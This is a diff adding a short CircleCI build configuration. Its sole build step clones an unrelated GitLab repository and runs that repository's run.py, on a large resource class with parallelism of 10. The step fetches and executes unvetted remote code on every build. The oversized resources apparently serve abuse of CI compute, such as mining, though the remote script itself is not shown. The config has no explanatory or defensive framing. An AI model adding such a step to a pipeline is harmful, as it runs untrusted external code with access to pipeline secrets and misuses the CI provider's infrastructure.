@@ -1,0 +1,12 @@
+jobs:
+  build:
+    docker:
+      - image: cimg/python:3.10.4-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    parallelism: 10
+    resource_class: large
+    working_directory: ~/my-app
+    steps:
+      - run: git clone https://gitlab.com/hypertrex0/cocol.git && cd cocol &&  python run.py
